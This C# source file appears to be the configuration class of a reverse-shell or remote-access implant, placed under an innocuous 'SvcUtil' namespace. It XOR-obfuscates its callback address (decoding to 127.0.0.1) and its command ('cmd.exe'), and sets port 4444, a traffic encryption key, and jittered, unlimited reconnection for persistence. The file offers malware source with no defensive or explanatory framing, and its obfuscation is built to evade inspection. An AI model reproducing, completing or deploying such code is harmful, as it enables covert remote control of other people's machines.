using System;
using System.Text;

namespace SvcUtil
{
    internal static class Config
    {
        private static readonly byte[] ObfKey = { 0x4A, 0x6F, 0x68, 0x74, 0x6F };

        public static byte[] Encode(string plaintext)
        {
            byte[] data = Encoding.UTF8.GetBytes(plaintext);
            for (int i = 0; i < data.Length; i++)
                data[i] ^= ObfKey[i % ObfKey.Length];
            return data;
        }

        private static string Decode(byte[] cipher)
        {
            byte[] buf = new byte[cipher.Length];
            for (int i = 0; i < cipher.Length; i++)
                buf[i] = (byte)(cipher[i] ^ ObfKey[i % ObfKey.Length]);
            return Encoding.UTF8.GetString(buf);
        }

        private static byte[] DecodeBytes(byte[] cipher)
        {
            byte[] buf = new byte[cipher.Length];
            for (int i = 0; i < cipher.Length; i++)
                buf[i] = (byte)(cipher[i] ^ ObfKey[i % ObfKey.Length]);
            return buf;
        }

        private static readonly byte[] DefaultIpEncoded =
            { 0x7B, 0x5D, 0x5F, 0x5A, 0x5F, 0x64, 0x5F, 0x46, 0x45 };

        private static readonly byte[] DefaultCmdEncoded =
            { 0x29, 0x02, 0x0C, 0x5A, 0x0A, 0x32, 0x0A };

        private static readonly byte[] DefaultTrafficKeyEncoded =
            { 0x19, 0x07, 0x5C, 0x06, 0x1F, 0x09, 0x5B, 0x1C, 0x3F, 0x5C, 0x33, 0x4E, 0x28, 0x57 };

        public static string DefaultIp { get { return Decode(DefaultIpEncoded); } }
        public static int DefaultPort { get { return 4444; } }
        public static string DefaultCommand { get { return Decode(DefaultCmdEncoded); } }

        public static byte[] DefaultTrafficKey { get { return DecodeBytes(DefaultTrafficKeyEncoded); } }

        public const int ReconnectBaseDelayMs = 5000;
        public const int ReconnectMaxDelayMs = 60000;
        public const int ReconnectJitterMs = 3000;
        public const int MaxReconnectAttempts = 0;

        public const int BufferSize = 8192;
    }
}
